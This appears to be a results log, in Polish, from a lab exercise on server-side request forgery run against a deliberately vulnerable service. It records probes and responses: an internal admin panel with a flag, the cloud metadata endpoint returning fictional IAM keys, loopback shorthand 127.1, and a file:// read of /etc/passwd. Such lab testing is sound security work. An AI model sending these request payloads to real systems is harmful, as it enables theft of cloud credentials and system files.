@@ -1,0 +1,26 @@
+﻿=== Dowody SSRF - tryb: vulnerable ===
+Data: 2026-10-10 13:36:30
+
+[T1] HTTP 200  Usluga wewnetrzna /admin
+      url : http://internal-api/admin
+      tresc: {"panel":"admin","secret_flag":"FLAG{SSRF-dosiegnieto-uslugi-wewnetrznej}","users":["admin","serwis-backup"]}
+
+[T2] HTTP 200  Serwis metadanych (token)
+      url : http://169.254.169.254/latest/meta-data/iam/security-credentials/demo-role
+      tresc: {"AccessKeyId":"AKIA-FIKCYJNE-DO-LABU","Note":"Dane nieprawdziwe - wygenerowane na potrzeby projektu P8.","SecretAccessKey":"sekret-fikcyjny...
+
+[T3] HTTP 502  Loopback - alternatywny zapis 127.1
+      url : http://127.1/
+      tresc: {"error":"HTTPConnectionPool(host='127.1', port=80): Max retries exceeded with url: / (Caused by NewConnectionError(\"HTTPConnection(host='1...
+
+[T6] HTTP 200  Odczyt lokalnego pliku file://
+      url : file:///etc/passwd
+      tresc: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr...
+
+[T7] HTTP 502  KONTROLNY - legalny URL z allowlisty
+      url : http://example-cdn.local/
+      tresc: {"error":"HTTPConnectionPool(host='example-cdn.local', port=80): Max retries exceeded with url: / (Caused by NameResolutionError(\"HTTPConne...
+
